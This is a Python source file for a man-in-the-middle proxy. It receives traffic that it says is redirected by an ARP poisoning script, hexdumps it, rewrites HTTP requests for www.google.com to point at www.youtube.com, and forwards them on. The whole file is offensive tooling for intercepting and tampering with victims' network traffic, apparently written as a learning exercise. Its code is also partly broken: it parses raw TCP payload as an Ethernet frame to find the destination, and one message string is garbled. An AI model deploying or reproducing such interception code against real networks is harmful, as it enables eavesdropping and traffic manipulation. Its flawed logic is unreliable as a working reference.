import threading
import sys
import socket
from scapy.all import Ether, IP
from urllib.parse import urlparse

HEX_FILTER = "".join([chr(i) if i in range(32, 127) else '.' for i in range(256)])

def hexdump(src, length=16, show=True):
    results = []
    for i in range(0, len(src), length):
        word = src[i:i+length]
        hexa = " ".join([f'{b:02X}' for b in word])
        printable = "".join([chr(b) if 32 <= b <= 126 else '.' for b in word])
        hex_length = length * 3
        results.append(f'{i:04X} {hexa:<{hex_length}} {printable}')
    if show:
        for line in results:
            print(line)
    else:
        return results

def receive_from(connection):
    buffer = b""
    connection.settimeout(10)
    try:
        while True:
            data = connection.recv(4096)
            if not len(data):
                break
            buffer += data
    except socket.timeout:
        print("Timeout  okiereceiving data")
    except Exception as e:
        print(f"Error receiving data: {e}")
    return buffer

def handle_http_request(data):
    try:
        headers, body = data.split(b'\r\n\r\n', 1) if b'\r\n\r\n' in data else (data, b'')
        headers_str = headers.decode('utf-8', errors='ignore')
        
        request_line = headers_str.split('\r\n')[0]
        try:
            method, url, _ = request_line.split(' ', 2)
        except ValueError:
            print("Malformed HTTP request line")
            return data
        
        parsed_url = urlparse(url)
        if parsed_url.netloc == 'www.google.com':
            print("Redirecting request from google.com to youtube.com")
            new_url = url.replace('www.google.com', 'www.youtube.com')
            headers_str = headers_str.replace(url, new_url)
            data = (headers_str + '\r\n\r\n').encode('utf-8') + body

    except Exception as e:
        print(f"Error handling HTTP request: {e}")
    return data

def send_to_destination(data):
    try:
        # Extract the destination address from the IP header
        ip_header = Ether(data).getlayer(IP)
        dst_ip = ip_header.dst
        dst_port = 80  # Assuming HTTP port

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as destination_socket:
            destination_socket.connect((dst_ip, dst_port))
            destination_socket.send(data)

            response = receive_from(destination_socket)
            return response
    except ConnectionRefusedError:
        print(f"Connection refused to {dst_ip}")
        return b"HTTP/1.1 500 Internal Server Error\r\n\r\n"
    except Exception as e:
        print(f"Error sending data to destination: {e}")
        return b"HTTP/1.1 500 Internal Server Error\r\n\r\n"

def proxy_handler(client_socket):
    remote_buffer = receive_from(client_socket)
    print("Received data from ARP Poisoning script:")
    hexdump(remote_buffer)

    if len(remote_buffer):
        try:
            # Modify the request if it's an HTTP request
            modified_payload = handle_http_request(remote_buffer)
            
            # Forward the data to the destination
            response = send_to_destination(modified_payload)
            client_socket.send(response)
        except Exception as e:
            print(f"Error handling data: {e}")

    client_socket.close()

def server_loop(local_port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(("0.0.0.0", local_port))  # Bind to all available interfaces
    except Exception as e:
        print("Binding failed")
        print(f"Error: {e}")
        sys.exit()
    
    server.listen(10)
    print(f"[*] Listening on 0.0.0.0:{local_port}")

    while True:
        client_socket, address = server.accept()
        print(f"[*] Connection Established from {address[0]}:{address[1]}")
        client_thread = threading.Thread(target=proxy_handler, args=(client_socket,))
        client_thread.start()

def main():
    server_loop()  # Start the server loop with default port 9999

if __name__ == "__main__":
    main()
